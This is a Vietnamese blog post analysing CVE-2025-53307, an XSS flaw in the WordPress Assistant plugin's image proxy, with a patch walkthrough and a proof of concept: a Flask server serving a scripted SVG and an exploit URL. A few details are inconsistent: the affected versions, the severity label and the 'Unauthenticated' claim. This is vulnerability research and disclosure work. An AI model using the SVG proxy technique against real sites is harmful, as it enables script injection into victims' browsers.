<!DOCTYPE html>
<html lang="vi">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>CVE-2025-53307 Analysis &amp; POC - w41bu1</title><meta name="Description" content="Security Vulnerability in WordPress Assistant Plugin."><meta property="og:url" content="http://localhost:1313/vi/2025-10-03-cve-2025-53307/">
  <meta property="og:site_name" content="w41bu1">
  <meta property="og:title" content="CVE-2025-53307 Analysis &amp; POC">
  <meta property="og:description" content="Security Vulnerability in WordPress Assistant Plugin.">
  <meta property="og:locale" content="vi">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-10-03T19:19:00+07:00">
    <meta property="article:modified_time" content="2025-10-03T19:19:00+07:00">
    <meta property="article:tag" content="Analyst">
    <meta property="article:tag" content="Plugin">
    <meta property="article:tag" content="Xss">
    <meta property="og:image" content="http://localhost:1313/logo.png">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="http://localhost:1313/logo.png">
  <meta name="twitter:title" content="CVE-2025-53307 Analysis &amp; POC">
  <meta name="twitter:description" content="Security Vulnerability in WordPress Assistant Plugin.">
<meta name="application-name" content="LoveIt">
<meta name="apple-mobile-web-app-title" content="LoveIt">
<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/vi/2025-10-03-cve-2025-53307/" /><link rel="prev" href="http://localhost:1313/vi/2025-10-02-cve-2025-6234/" /><link rel="next" href="http://localhost:1313/vi/2025-10-04-cve-2025-27006/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "CVE-2025-53307 Analysis \u0026 POC",
        "inLanguage": "vi",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "http:\/\/localhost:1313\/vi\/2025-10-03-cve-2025-53307\/"
        },"image": ["http:\/\/localhost:1313\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "analyst, plugin, xss","wordcount":  765 ,
        "url": "http:\/\/localhost:1313\/vi\/2025-10-03-cve-2025-53307\/","datePublished": "2025-10-03T19:19:00+07:00","dateModified": "2025-10-03T19:19:00+07:00","license": "Tác phẩm này được cấp phép theo Giấy phép Creative Commons Ghi công - Phi thương mại 4.0 Quốc tế.","publisher": {
            "@type": "Organization",
            "name": "w41bu1","logo": {
                    "@type": "ImageObject",
                    "url": "http:\/\/localhost:1313\/images\/avatar.jpeg",
                    "width":  736 ,
                    "height":  736 
                }},"author": {
                "@type": "Person",
                "name": "w41bu1"
            },"description": "Security Vulnerability in WordPress Assistant Plugin."
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
          const query = window.matchMedia('(prefers-color-scheme: dark)');
          function applyTheme() {
            let theme = window.localStorage?.getItem('theme') || 'auto';
            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
            document.body.setAttribute('theme', isDark? 'dark' : 'light');
            document.body.setAttribute('cfg-theme', theme);
          }

          applyTheme();
          query.addEventListener('change', applyTheme);
        </script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/vi/" title="w41bu1"><span class="header-title-pre"><i class='fa-solid fa-bug fa-fw' aria-hidden='true'></i></span>w41bu1</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/vi/posts/"> Posts </a><a class="menu-item" href="/vi/tags/"> Tags </a><a class="menu-item" href="/vi/categories/"> Categories </a><a class="menu-item" href="/vi/categories/documentation/"> Docs </a><a class="menu-item" href="/vi/about/"> About </a><a class="menu-item" href="https://github.com/dillonzq/LoveIt" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Tìm kiếm..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Tìm kiếm">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Xoá">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Đổi chủ đề">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a><a href="javascript:void(0);" class="menu-item language" title="Chọn Ngôn ngữ">
                    <i class="fa fa-globe fa-fw" aria-hidden="true"></i>                      
                    <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/2025-10-03-cve-2025-53307/">English</option><option value="/vi/2025-10-03-cve-2025-53307/" selected>Vietnamese</option></select>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/vi/" title="w41bu1"><span class="header-title-pre"><i class='fa-solid fa-bug fa-fw' aria-hidden='true'></i></span>w41bu1</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Tìm kiếm..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Tìm kiếm">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Xoá">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Huỷ
                    </a>
                </div><a class="menu-item" href="/vi/posts/" title="">Posts</a><a class="menu-item" href="/vi/tags/" title="">Tags</a><a class="menu-item" href="/vi/categories/" title="">Categories</a><a class="menu-item" href="/vi/categories/documentation/" title="">Docs</a><a class="menu-item" href="/vi/about/" title="">About</a><a class="menu-item" href="https://github.com/dillonzq/LoveIt" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Đổi chủ đề">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a><a href="javascript:void(0);" class="menu-item" title="Chọn Ngôn ngữ">
                    <i class="fa fa-globe fa-fw" aria-hidden="true"></i>
                    <select class="language-select" onchange="location = this.value;"><option value="/2025-10-03-cve-2025-53307/">English</option><option value="/vi/2025-10-03-cve-2025-53307/" selected>Vietnamese</option></select>
                </a></div>
    </div>
</header><div class="search-dropdown desktop">
        <div id="search-dropdown-desktop"></div>
    </div>
    <div class="search-dropdown mobile">
        <div id="search-dropdown-mobile"></div>
    </div><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Nội dung</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">CVE-2025-53307 Analysis & POC</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="https://w41bu1.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>w41bu1</a></span>&nbsp;<span class="post-category">trong <a href="/vi/categories/cve-analyst/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>CVE Analyst</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-10-03">2025-10-03</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;765 từ&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 phút&nbsp;</div>
        </div><div class="featured-image"><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/2025-10-03-cve-2025-53307/app.png"
        data-srcset="/2025-10-03-cve-2025-53307/app.png, /2025-10-03-cve-2025-53307/app.png 1.5x, /2025-10-03-cve-2025-53307/app.png 2x"
        data-sizes="auto"
        alt="/2025-10-03-cve-2025-53307/app.png"
        title="Security Vulnerability in WordPress Assistant Plugin." width="1544" height="500" /></div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Nội dung</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#requirements">Requirements</a></li>
    <li><a href="#analysis">Analysis</a>
      <ul>
        <li><a href="#patch-diff">Patch Diff</a></li>
        <li><a href="#how-it-work">How it work?</a></li>
      </ul>
    </li>
    <li><a href="#exploit">Exploit</a>
      <ul>
        <li><a href="#detect-xss">Detect XSS</a></li>
      </ul>
    </li>
    <li><a href="#conclusion">Conclusion</a></li>
    <li><a href="#references">References</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><hr>
<p>Lỗ hổng xảy ra trên plugin <strong>Assistant</strong> của WordPress trước phiên bản <strong>3.6.2</strong>. Điều này có thể cho phép kẻ tấn công chèn mã độc (ví dụ: script chuyển hướng, quảng cáo, hoặc các payload HTML khác) vào website, và những mã đó sẽ được thực thi khi khách truy cập mở trang.</p>
<ul>
<li><strong>CVE ID</strong>: <a href="https://www.cve.org/CVERecord?id=CVE-2025-53307" target="_blank" rel="noopener noreffer ">CVE-2025-53307</a></li>
<li><strong>Product</strong>: <a href="https://wordpress.org/plugins/assistant/" target="_blank" rel="noopener noreffer ">WordPress Assistant Plugin</a></li>
<li><strong>Vulnerability Type</strong>: Cross Site Scripting</li>
<li><strong>Affected Versions</strong>: &lt;= 1.5.2</li>
<li><strong>CVSS severity</strong>: Medium (7.1)</li>
<li><strong>Required Privilege</strong>: Unauthenticated</li>
</ul>
<hr>
<h2 id="requirements">Requirements</h2>
<ul>
<li><a href="https://w41bu1.github.io/posts/wordpress-local-and-debugging/" target="_blank" rel="noopener noreffer "><strong>Local WordPress and Debugging</strong></a></li>
<li><strong>Assistant</strong>:  v1.5.2(vul) và v1.5.3(fix)</li>
<li><strong>diff tool</strong>: <strong>meld</strong> hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version</li>
</ul>
<hr>
<h2 id="analysis">Analysis</h2>
<p>Ứng dụng hiển thị trực tiếp nội dung hình ảnh do người dùng cung cấp thông qua URL <strong>mà không xác thực và kiểm tra đầy đủ MIME type</strong>. Điều này dẫn đến việc kẻ tấn công có thể cung cấp một tập tin giả dạng hình ảnh và khi được trình duyệt xử lý, nó sẽ thực thi mã độc =&gt; gây ra lỗ hổng XSS.</p>
<h3 id="patch-diff">Patch Diff</h3>
<p>Dùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá.</p>
<p><figure><a class="lightgallery" href="/2025-10-03-cve-2025-53307/patch_diff.png" title="Patch Diff" data-thumbnail="/2025-10-03-cve-2025-53307/patch_diff.png" data-sub-html="<h2>Diff giữa bản lỗi và bản vá</h2><p>Patch Diff</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-10-03-cve-2025-53307/patch_diff.png"
            data-srcset="/2025-10-03-cve-2025-53307/patch_diff.png, /2025-10-03-cve-2025-53307/patch_diff.png 1.5x, /2025-10-03-cve-2025-53307/patch_diff.png 2x"
            data-sizes="auto"
            alt="/2025-10-03-cve-2025-53307/patch_diff.png" width="1618" height="946" />
    </a><figcaption class="image-caption">Diff giữa bản lỗi và bản vá</figcaption>
    </figure></p>
<p>Trong trường hợp này, sự khác biệt giữa 2 phiên bản khá nhiều, để thuận lợi cho việc truy vết, ta có thể xem <a href="https://wordpress.org/plugins/assistant/#developers" target="_blank" rel="noopener noreffer ">change log</a> để biết bản vá lỗ hổng XSS ở đâu:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><pre tabindex="0"><code>Changelog
1.5.3 ( 2025-09-08 )

- Changes to support the integration of Assistant in Beaver Builder version 2.10
- Fixed dark mode issues on the Home app and sidebar.
- Security: Fixed a potential XSS vulnerability in the &#34;image proxy&#34;</code></pre></div>
<p>👉 Lỗ hỗng nằm trong file <strong>backend/src/Hooks/ImageProxy.php</strong>, ta quan sát sự khác biệt của 2 phiên bản:</p>
<p><figure><a class="lightgallery" href="/2025-10-03-cve-2025-53307/patch_diff1.png" title="Patch Diff 1" data-thumbnail="/2025-10-03-cve-2025-53307/patch_diff1.png" data-sub-html="<h2>Sự khác biệt trong hàm render_image của ImageProxy.php</h2><p>Patch Diff 1</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-10-03-cve-2025-53307/patch_diff1.png"
            data-srcset="/2025-10-03-cve-2025-53307/patch_diff1.png, /2025-10-03-cve-2025-53307/patch_diff1.png 1.5x, /2025-10-03-cve-2025-53307/patch_diff1.png 2x"
            data-sizes="auto"
            alt="/2025-10-03-cve-2025-53307/patch_diff1.png" width="1638" height="830" />
    </a><figcaption class="image-caption">Sự khác biệt trong hàm render_image của ImageProxy.php</figcaption>
    </figure></p>
<p>Sự thay đổi xảy ra ở hàm <code>render_image</code> với chức năng:</p>
<ul>
<li>
<p>Nhận tham số url từ query string <code>($_GET['url'])</code>.</p>
</li>
<li>
<p>Gửi request từ server đến URL đó để tải nội dung.</p>
</li>
<li>
<p>Chống <strong>ssrf</strong> bằng <code>wp_safe_remote_get</code>.</p>
</li>
<li>
<p>Nếu nội dung có header <strong>Content-Type</strong> bắt đầu bằng <code>image/</code>, thì:</p>
<ul>
<li>Gửi lại header <strong>Content-Type</strong> đó cho client.</li>
<li>In (echo) toàn bộ nội dung file ra cho trình duyệt.</li>
</ul>
</li>
<li>
<p>Trình duyệt hiển thị hình ảnh <strong>không phải trực tiếp từ nguồn gốc mà thông qua server WordPress</strong>.</p>
</li>
</ul>
<blockquote>
<p>SVG cũng có <strong>Content-Type</strong> bắt đầu bằng <code>image/</code> và có thể chứa mã JavaScript bên trong =&gt; XSS có thể xảy ra.</p>
</blockquote>
<p>Bản vá đã thêm một lớp kiểm tra <strong>MIME type</strong> thực sự của file để tránh kịch bản XSS bằng SVG hay file giả mạo.</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-php">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$filesystem</span> <span class="o">=</span> <span class="nx">self</span><span class="o">::</span><span class="na">filesystem</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$tmpfile</span>    <span class="o">=</span> <span class="nx">tempnam</span><span class="p">(</span> <span class="s1">&#39;/tmp&#39;</span><span class="p">,</span> <span class="s1">&#39;assistant&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$filesystem</span><span class="o">-&gt;</span><span class="na">put_contents</span><span class="p">(</span> <span class="nv">$tmpfile</span><span class="p">,</span> <span class="nv">$body</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$validimage</span> <span class="o">=</span> <span class="nx">wp_get_image_mime</span><span class="p">(</span> <span class="nv">$tmpfile</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$filesystem</span><span class="o">-&gt;</span><span class="na">delete</span><span class="p">(</span> <span class="nv">$tmpfile</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nv">$validimage</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
<p><a href="https://github.com/WordPress/wordpress-develop/blob/6.8.2/src/wp-includes/functions.php#L3330-L3417" target="_blank" rel="noopener noreffer "><code>wp_get_image_mime()</code></a> sử dụng hàm xử lý ảnh nội bộ (dựa trên dữ liệu binary của file) để xác định MIME thực sự.</p>
<p>Nếu kết quả không phải là ảnh hợp lệ =&gt; return <strong>false</strong>.</p>
<h3 id="how-it-work">How it work?</h3>
<p>Trong <code>__construct</code> của class <code>ImageProxy</code>, phương thức <code>render_image()</code> được gọi thông qua callback của action hook <code>'init'</code>. Hook <code>'init'</code> được thực thi rất sớm trong quá trình load WordPress, sau khi các đối tượng core được khởi tạo nhưng trước khi gửi output ra trình duyệt.</p>
<p><code>render_image</code> chỉ được gọi khi người dùng hiện tại có quyền chỉnh sửa bài viết của người khác và tham số <code>$_GET['fl_asst_image_proxy']</code> tồn tại.</p>
<p>👉 Khi truy cập <code>/wp-admin/?fl_asst_image_proxy=value1&amp;url=http://yoursite/image-path</code> thì <code>render_image</code> sẽ được gọi và trả về nội dung hình ảnh cho trình duyệt hiển thị.</p>
<hr>
<h2 id="exploit">Exploit</h2>
<h3 id="detect-xss">Detect XSS</h3>
<p>Tạo 1 trang <a href="https://github.com/w41bu1/w41test" target="_blank" rel="noopener noreffer ">web</a> đơn giản trả về nội dung SVG chứa XSS payload</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-py">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">Response</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">home</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;Hello, World!&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/svg&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">about</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">svg</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;script&gt;alert(document.domain)&lt;/script&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;/svg&gt;&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="n">svg</span><span class="p">,</span> <span class="n">mimetype</span><span class="o">=</span><span class="s2">&#34;image/svg+xml&#34;</span><span class="p">)</span></span></span></code></pre></div></div>
<p>Gửi request chứa <strong>url param</strong> trỏ đến <code>https://yoursite/svg</code></p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><pre tabindex="0"><code>http://localhost/wp-admin/?fl_asst_image_proxy=abc&amp;url=https://yoursite/svg</code></pre></div>
<p>👉 Thành công với <code>Unauthenticated</code> vì chỉ cần người dùng có quyền, khi truy cập url =&gt; XSS xảy ra trên trình duyệt của nạn nhân. Attacker không cần đăng nhập.</p>
<p><figure><a class="lightgallery" href="/2025-10-03-cve-2025-53307/detect.png" title="Detect" data-thumbnail="/2025-10-03-cve-2025-53307/detect.png" data-sub-html="<h2>SVG chứa XSS payload được hiển thị qua image proxy</h2><p>Detect</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-10-03-cve-2025-53307/detect.png"
            data-srcset="/2025-10-03-cve-2025-53307/detect.png, /2025-10-03-cve-2025-53307/detect.png 1.5x, /2025-10-03-cve-2025-53307/detect.png 2x"
            data-sizes="auto"
            alt="/2025-10-03-cve-2025-53307/detect.png" width="1264" height="318" />
    </a><figcaption class="image-caption">SVG chứa XSS payload được hiển thị qua image proxy</figcaption>
    </figure></p>
<hr>
<h2 id="conclusion">Conclusion</h2>
<p>Lỗ hổng <strong>CVE-2025-53307</strong> trong plugin WordPress Assistant (<strong>&lt;= v1.5.2</strong>) cho phép XSS thông qua <code>render_image()</code> vì không kiểm tra <strong>MIME type</strong> thực của file. Bản vá <strong>v1.5.3</strong> đã khắc phục bằng cách xác thực nội dung file trước khi trả về trình duyệt.</p>
<p><strong>Key takeaways</strong>:</p>
<ul>
<li>Không tin cậy vào <strong>Content-Type header</strong> từ <strong>HTTP response</strong>.</li>
<li>Luôn xác thực <strong>MIME type</strong> thực sự của file.</li>
</ul>
<hr>
<h2 id="references">References</h2>
<p><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank" rel="noopener noreffer ">Cross-site scripting (XSS) cheat sheet</a></p>
<p><a href="https://patchstack.com/database/wordpress/plugin/assistant/vulnerability/wordpress-assistant-plugin-1-5-2-cross-site-scripting-xss-vulnerability" target="_blank" rel="noopener noreffer ">WordPress WordPress Assistant Plugin &lt;= 1.5.2 is vulnerable to Cross Site Scripting (XSS)</a></p>
<hr>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Cập nhật ngày 2025-10-03</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"><span>
                            <a class="link-to-markdown" href="/vi/2025-10-03-cve-2025-53307/index.md" target="_blank">Đọc với định dạng Markdown</a>
                        </span></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Chia sẻ trên X" data-sharer="x" data-url="http://localhost:1313/vi/2025-10-03-cve-2025-53307/" data-title="CVE-2025-53307 Analysis &amp; POC" data-hashtags="analyst,plugin,xss"><i class="fab fa-x-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Chia sẻ trên Threads" data-sharer="threads" data-url="http://localhost:1313/vi/2025-10-03-cve-2025-53307/" data-title="CVE-2025-53307 Analysis &amp; POC"><i class="fab fa-threads fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Chia sẻ trên Facebook" data-sharer="facebook" data-url="http://localhost:1313/vi/2025-10-03-cve-2025-53307/" data-hashtag="analyst"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Chia sẻ trên Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/vi/2025-10-03-cve-2025-53307/" data-title="CVE-2025-53307 Analysis &amp; POC"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Chia sẻ trên Line" data-sharer="line" data-url="http://localhost:1313/vi/2025-10-03-cve-2025-53307/" data-title="CVE-2025-53307 Analysis &amp; POC"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Chia sẻ trên 微博" data-sharer="weibo" data-url="http://localhost:1313/vi/2025-10-03-cve-2025-53307/" data-title="CVE-2025-53307 Analysis &amp; POC" data-image="app.png"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Chia sẻ trên Diaspora" data-sharer="diaspora" data-url="http://localhost:1313/vi/2025-10-03-cve-2025-53307/" data-title="CVE-2025-53307 Analysis &amp; POC" data-description="Security Vulnerability in WordPress Assistant Plugin."><i class="fab fa-diaspora fa-fw" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=http%3a%2f%2flocalhost%3a1313%2fvi%2f2025-10-03-cve-2025-53307%2f&amp;text=CVE-2025-53307%20Analysis%20%26%20POC" target="_blank" title="Chia sẻ trên Telegram"><i class="fab fa-telegram fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/vi/tags/analyst/">Analyst</a>,&nbsp;<a href="/vi/tags/plugin/">Plugin</a>,&nbsp;<a href="/vi/tags/xss/">Xss</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Quay lại</a></span>&nbsp;|&nbsp;<span><a href="/vi/">Trang chủ</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/vi/2025-10-02-cve-2025-6234/" class="prev" rel="prev" title="CVE-2025-6234 Analysis &amp; POC"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>CVE-2025-6234 Analysis & POC</a>
            <a href="/vi/2025-10-04-cve-2025-27006/" class="next" rel="next" title="CVE-2025-27006 Analysis &amp; POC">CVE-2025-27006 Analysis & POC<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://w41bu1.github.io" target="_blank">w41bu1</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Lên trên">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a>
        </div>

        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="Xem bình luận">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/algoliasearch/lite/browser.umd.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/lightgallery/lightgallery.min.js"></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"search":{"algoliaAppID":"GZT24PWKNT","algoliaIndex":"index","algoliaSearchKey":"634ab679e825b815de2663de38908f9d","highlightTag":"em","maxResultLength":10,"noResultsFound":"Không tìm thấy","snippetLength":50,"type":"algolia"}};</script><script src="/js/theme.min.js"></script></body>
</html>
